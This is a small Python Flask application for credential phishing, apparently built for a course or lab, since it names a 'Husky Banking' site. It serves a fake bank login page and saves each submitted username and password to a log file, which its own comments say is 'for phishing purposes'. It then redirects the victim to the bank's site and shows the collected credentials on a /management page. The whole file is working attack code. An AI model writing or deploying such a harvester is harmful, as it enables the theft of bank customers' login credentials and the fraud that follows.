from flask import Flask, render_template, request, redirect
import os

# Define relative path to log.txt in the same directory as this script
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH = os.path.join(BASE_DIR, 'log.txt')

app = Flask(__name__, static_url_path='/static')

@app.route("/")  # Landing page
def bank():
    return render_template('bank.html')  # The form to collect user and password

@app.route("/management")
def manager():
    try:
        with open(LOG_PATH, 'r') as file:
            return file.read()  # Displays collected user credentials in log.txt
    except FileNotFoundError:
        return "Log file not found."

@app.route("/submit", methods=['POST'])
def submit_form():  # When user submits the form
    user = request.form.get('user')  # Get the entered username
    password = request.form.get('pwd')  # Get the entered password

    try:
        with open(LOG_PATH, 'a') as file:
            # Log the user credentials (for phishing purposes)
            file.write(f'[user: {user}\n')
            file.write(f'password: {password}]\n\n')
    except Exception as e:
        return f"Error writing to log file: {e}"

    # Redirect user to the actual Husky Banking website (or the fake one, e.g., bank.com)
    return redirect("http://bank.com/loggedIn")  # Replace with the real website URL or a simulation URL

if __name__ == '__main__':
    print("Using log file at:", LOG_PATH)
    app.run(debug=True)
